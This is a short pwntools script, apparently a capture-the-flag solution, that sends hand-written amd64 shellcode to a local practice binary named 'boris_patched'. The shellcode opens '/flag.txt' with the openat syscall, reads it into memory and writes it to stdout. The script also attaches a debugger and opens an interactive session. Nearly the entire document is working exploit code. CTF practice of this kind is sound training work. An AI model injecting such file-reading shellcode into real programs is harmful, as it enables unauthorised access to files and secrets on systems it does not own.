
from pwn import *


# >>> hex(ord('/'))
# '0x2f'
# >>> hex(ord('f'))
# '0x66'
# >>> hex(ord('l'))
# '0x6c'
# >>> hex(ord('a'))
# '0x61'
# >>> hex(ord('g'))
# '0x67'
# >>> hex(ord('.'))
# '0x2e'
# >>> hex(ord('t'))
# '0x74'
# >>> hex(ord('x'))
# '0x78'
# >>> hex(ord('t'))
# '0x74'
# >>> hex(ord(''))

p = process('./boris_patched')
pid = gdb.attach(p,gdbscript='b * main+486')
context(os='linux')

sc= asm("""

    mov r10, 0x78742e67616c662f
    mov r11, 0x74
    push r11    
    push r10
    mov rax, 257
    mov rsi, rsp
    mov rdx, 0x0
    mov rdi, -100
    mov r10, 0x0
    syscall


    mov rdi, rax
    mov rsi, 0xdead500
    mov rdx, 0x100
    mov rax, 0
    syscall


    mov rax, 0x1
    mov rdi, 1
    mov rsi, 0xdead500
    mov rdx, 0x100
    syscall



""",
arch='amd64',
os ='linux'
)

p.send(sc)

p.interactive()